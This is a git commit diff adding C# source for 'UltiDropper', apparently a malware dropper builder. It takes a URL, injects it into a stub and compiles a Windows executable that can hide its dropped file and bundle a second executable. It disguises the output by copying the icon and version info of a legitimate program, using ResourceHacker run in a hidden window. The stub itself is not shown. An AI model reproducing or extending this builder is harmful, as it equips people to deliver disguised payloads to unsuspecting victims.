7fa206ef276587a6143bf60f4cc50d740db14a94
Traween <tim.vuegen@hotmail.com>
2015-12-27 20:19:51 +0000

    v0.1
    Initial upload

---
+++ UltiDropper/Form1.Designer.cs
@@ -0,0 +1,205 @@
+﻿namespace UltiDropper
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.tbLocation = new System.Windows.Forms.TextBox();
+            this.btnBuild = new System.Windows.Forms.Button();
+            this.groupBox1 = new System.Windows.Forms.GroupBox();
+            this.cbHideFile = new System.Windows.Forms.CheckBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.groupBox2 = new System.Windows.Forms.GroupBox();
+            this.tbFile = new System.Windows.Forms.TextBox();
+            this.btnOpenFile = new System.Windows.Forms.Button();
+            this.btnClone = new System.Windows.Forms.Button();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.btnLoadIcon = new System.Windows.Forms.Button();
+            this.groupBox3 = new System.Windows.Forms.GroupBox();
+            this.groupBox1.SuspendLayout();
+            this.groupBox2.SuspendLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.groupBox3.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // tbLocation
+            // 
+            this.tbLocation.Location = new System.Drawing.Point(35, 19);
+            this.tbLocation.Name = "tbLocation";
+            this.tbLocation.Size = new System.Drawing.Size(483, 20);
+            this.tbLocation.TabIndex = 0;
+            // 
+            // btnBuild
+            // 
+            this.btnBuild.Location = new System.Drawing.Point(12, 348);
+            this.btnBuild.Name = "btnBuild";
+            this.btnBuild.Size = new System.Drawing.Size(75, 23);
+            this.btnBuild.TabIndex = 1;
+            this.btnBuild.Text = "Build";
+            this.btnBuild.UseVisualStyleBackColor = true;
+            this.btnBuild.Click += new System.EventHandler(this.btnBuild_Click);
+            // 
+            // groupBox1
+            // 
+            this.groupBox1.Controls.Add(this.cbHideFile);
+            this.groupBox1.Controls.Add(this.tbLocation);
+            this.groupBox1.Controls.Add(this.label1);
+            this.groupBox1.Location = new System.Drawing.Point(12, 12);
+            this.groupBox1.Name = "groupBox1";
+            this.groupBox1.Size = new System.Drawing.Size(524, 72);
+            this.groupBox1.TabIndex = 2;
+            this.groupBox1.TabStop = false;
+            this.groupBox1.Text = "Settings";
+            // 
+            // cbHideFile
+            // 
+            this.cbHideFile.AutoSize = true;
+            this.cbHideFile.Location = new System.Drawing.Point(9, 45);
+            this.cbHideFile.Name = "cbHideFile";
+            this.cbHideFile.Size = new System.Drawing.Size(67, 17);
+            this.cbHideFile.TabIndex = 1;
+            this.cbHideFile.Text = "Hide File";
+            this.cbHideFile.UseVisualStyleBackColor = true;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(6, 22);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(23, 13);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "Url:";
+            // 
+            // groupBox2
+            // 
+            this.groupBox2.Controls.Add(this.tbFile);
+            this.groupBox2.Controls.Add(this.btnOpenFile);
+            this.groupBox2.Location = new System.Drawing.Point(12, 91);
+            this.groupBox2.Name = "groupBox2";
+            this.groupBox2.Size = new System.Drawing.Size(524, 53);
+            this.groupBox2.TabIndex = 3;
+            this.groupBox2.TabStop = false;
+            this.groupBox2.Text = "Binder";
+            // 
+            // tbFile
+            // 
+            this.tbFile.Location = new System.Drawing.Point(44, 19);
+            this.tbFile.Name = "tbFile";
+            this.tbFile.Size = new System.Drawing.Size(473, 20);
+            this.tbFile.TabIndex = 1;
+            // 
+            // btnOpenFile
+            // 
+            this.btnOpenFile.Location = new System.Drawing.Point(6, 17);
+            this.btnOpenFile.Name = "btnOpenFile";
+            this.btnOpenFile.Size = new System.Drawing.Size(31, 23);
+            this.btnOpenFile.TabIndex = 0;
+            this.btnOpenFile.Text = "...";
+            this.btnOpenFile.UseVisualStyleBackColor = true;
+            this.btnOpenFile.Click += new System.EventHandler(this.btnOpenFile_Click);
+            // 
+            // btnClone
+            // 
+            this.btnClone.Location = new System.Drawing.Point(73, 19);
+            this.btnClone.Name = "btnClone";
+            this.btnClone.Size = new System.Drawing.Size(61, 23);
+            this.btnClone.TabIndex = 4;
+            this.btnClone.Text = "Clone";
+            this.btnClone.UseVisualStyleBackColor = true;
+            this.btnClone.Click += new System.EventHandler(this.btnClone_Click);
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.pictureBox1.Location = new System.Drawing.Point(6, 48);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(128, 134);
+            this.pictureBox1.TabIndex = 2;
+            this.pictureBox1.TabStop = false;
+            // 
+            // btnLoadIcon
+            // 
+            this.btnLoadIcon.Location = new System.Drawing.Point(6, 19);
+            this.btnLoadIcon.Name = "btnLoadIcon";
+            this.btnLoadIcon.Size = new System.Drawing.Size(61, 23);
+            this.btnLoadIcon.TabIndex = 3;
+            this.btnLoadIcon.Text = "Load";
+            this.btnLoadIcon.UseVisualStyleBackColor = true;
+            this.btnLoadIcon.Click += new System.EventHandler(this.btnLoadIcon_Click);
+            // 
+            // groupBox3
+            // 
+            this.groupBox3.Controls.Add(this.btnLoadIcon);
+            this.groupBox3.Controls.Add(this.btnClone);
+            this.groupBox3.Controls.Add(this.pictureBox1);
+            this.groupBox3.Location = new System.Drawing.Point(12, 151);
+            this.groupBox3.Name = "groupBox3";
+            this.groupBox3.Size = new System.Drawing.Size(142, 191);
+            this.groupBox3.TabIndex = 19;
+            this.groupBox3.TabStop = false;
+            this.groupBox3.Text = "Icon";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(548, 380);
+            this.Controls.Add(this.groupBox3);
+            this.Controls.Add(this.groupBox2);
+            this.Controls.Add(this.groupBox1);
+            this.Controls.Add(this.btnBuild);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "Form1";
+            this.Text = "UltiDropper";
+            this.groupBox1.ResumeLayout(false);
+            this.groupBox1.PerformLayout();
+            this.groupBox2.ResumeLayout(false);
+            this.groupBox2.PerformLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.groupBox3.ResumeLayout(false);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.TextBox tbLocation;
+        private System.Windows.Forms.Button btnBuild;
+        private System.Windows.Forms.GroupBox groupBox1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.CheckBox cbHideFile;
+        private System.Windows.Forms.GroupBox groupBox2;
+        private System.Windows.Forms.TextBox tbFile;
+        private System.Windows.Forms.Button btnOpenFile;
+        private System.Windows.Forms.Button btnClone;
+        private System.Windows.Forms.PictureBox pictureBox1;
+        private System.Windows.Forms.Button btnLoadIcon;
+        private System.Windows.Forms.GroupBox groupBox3;
+    }
+}
+
---
+++ UltiDropper/Form1.cs
@@ -0,0 +1,166 @@
+﻿using System;
+using System.Windows.Forms;
+using UltiDropper.Properties;
+using System.CodeDom.Compiler;
+using System.Diagnostics;
+using System.IO;
+using System.Resources;
+using Microsoft.CSharp;
+using System.Drawing;
+using System.Linq;
+using System.Web;
+using UltiDropper.IconFolder;
+
+namespace UltiDropper
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+            pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
+            _currentFolder = AppDomain.CurrentDomain.BaseDirectory;
+        }
+
+        private Icon _icon;
+        private string _fileToCloneLocation;
+        private readonly string _currentFolder;
+
+        private void btnBuild_Click(object sender, EventArgs e)
+        {
+            if (string.IsNullOrEmpty(tbLocation.Text)) return;
+
+            Uri uri;
+            if (!Uri.TryCreate(tbLocation.Text, UriKind.Absolute, out uri) && (uri.Scheme == Uri.UriSchemeHttp || uri.Scheme == Uri.UriSchemeHttps))
+            {
+                MessageBox.Show(Resources.BadUrl, Resources.Name, MessageBoxButtons.OK,
+                    MessageBoxIcon.Information);
+                return;
+            }
+
+            string path;
+            using (var sfd = new SaveFileDialog())
+            {
+                if (sfd.ShowDialog() != DialogResult.OK) return;
+                path = sfd.FileName;
+            }
+
+            var source = Resources.Stub;
+
+            source = source.Replace("[LINK]", tbLocation.Text);
+
+            var compilerargs = new CompilerParameters(new []{"System.dll"}) { GenerateExecutable = true, OutputAssembly = path, CompilerOptions = "/target:winexe /platform:x86" };
+
+            if (_icon != null)
+            {
+                var tempfilename = Path.GetTempPath() + "\\tempico.ico";
+                using (var fileStream = new FileStream(tempfilename, FileMode.OpenOrCreate))
+                    _icon.Save(fileStream);
+
+                compilerargs.CompilerOptions += " /win32icon:" + tempfilename;
+            }
+
+            source = source.Replace("[HIDE]",cbHideFile.Checked ? "File.SetAttributes(loc, FileAttributes.Hidden);" : string.Empty);
+
+            //binder
+            if (!string.IsNullOrEmpty(tbFile.Text))
+            {
+                compilerargs.EmbeddedResources.Add("files.resources");
+
+                var dropsource = Resources.Binder;
+                using (var rw = new ResourceWriter("files.resources"))
+                {
+                    var resourcename = Guid.NewGuid().ToString().Replace("-", "");
+                    dropsource = dropsource.Replace("[RESOURCE]", resourcename);
+                    rw.AddResource(resourcename, File.ReadAllBytes(tbFile.Text));
+                }
+
+                source = source.Replace("[BINDCODE]", dropsource);
+            }
+            else
+            {
+                source = source.Replace("[BINDCODE]", string.Empty);
+            }
+
+            var compilerresult = new CSharpCodeProvider().CompileAssemblyFromSource(compilerargs, source);
+
+            if (!string.IsNullOrEmpty(_fileToCloneLocation) && compilerresult.Errors.Count < 1)
+            {
+                var tempfilename = _currentFolder + "res.exe";
+                File.WriteAllBytes(tempfilename, Resources.ResourceHacker);
+
+                try
+                {
+                    var startinfo = new ProcessStartInfo { WindowStyle = ProcessWindowStyle.Hidden, FileName = tempfilename, Arguments = $"-extract {_fileToCloneLocation},{_currentFolder + "info.res"},versioninfo,," };
+                    Process.Start(startinfo)?.WaitForExit();
+                    startinfo.Arguments = $"-delete {path},{path},versioninfo,,";
+                    Process.Start(startinfo)?.WaitForExit();
+                    startinfo.Arguments = $"-addoverwrite {path},{path},{_currentFolder + "info.res"},versioninfo,,";
+                    Process.Start(startinfo)?.WaitForExit();
+
+                    File.Delete(tempfilename);
+                    File.Delete(_currentFolder + "res.ini");
+                    File.Delete(_currentFolder + "res.log");
+                    File.Delete(_currentFolder + "info.res");
+                    File.Delete(_currentFolder + "files.resources");
+                }
+                catch
+                {
+                    MessageBox.Show(Resources.VersionInfoFailure, Resources.Name, MessageBoxButtons.OK,MessageBoxIcon.Information);
+                }
+
+            }
+
+            foreach (CompilerError error in compilerresult.Errors)
+            {
+                MessageBox.Show(error.ErrorText);
+            }
+
+        }
+
+        private void btnOpenFile_Click(object sender, EventArgs e)
+        {
+            using (var ofd = new OpenFileDialog())
+            {
+                ofd.Filter = Resources.ExeFilter;
+                ofd.FileName = string.Empty;
+
+                if (ofd.ShowDialog() != DialogResult.OK) return;
+                tbFile.Text = ofd.FileName;
+            }
+        }
+
+        private void btnLoadIcon_Click(object sender, EventArgs e)
+        {
+            using (var ofd = new OpenFileDialog())
+            {
+                ofd.FileName = string.Empty;
+                ofd.Filter = Resources.IconFilter;
+                if (ofd.ShowDialog() != DialogResult.OK || Path.GetExtension(ofd.FileName) != ".ico") return;
+
+                _icon = new Icon(ofd.FileName);
+                var icons = IconUtil.Split(_icon);
+                var biggesticon = icons.Aggregate((icon1, icon2) => icon1.Width * icon1.Height > icon2.Width * icon2.Height ? icon1 : icon2);
+                pictureBox1.Image = IconUtil.ToBitmap(biggesticon);
+            }
+        }
+
+        private void btnClone_Click(object sender, EventArgs e)
+        {
+            using (var ofd = new OpenFileDialog())
+            {
+                ofd.FileName = string.Empty;
+                ofd.Filter = Resources.ExeFilter;
+                if (ofd.ShowDialog() != DialogResult.OK) return;
+
+                var iconextractor = new IconExtractor(ofd.FileName);
+                var icons = IconUtil.Split(iconextractor.GetIcon(0));
+                _icon = iconextractor.GetIcon(0);
+                var biggesticon = icons.Aggregate((icon1, icon2) => icon1.Width * icon1.Height > icon2.Width * icon2.Height ? icon1 : icon2);
+                pictureBox1.Image = IconUtil.ToBitmap(biggesticon);
+
+                _fileToCloneLocation = ofd.FileName;
+            }
+        }
+    }
+}
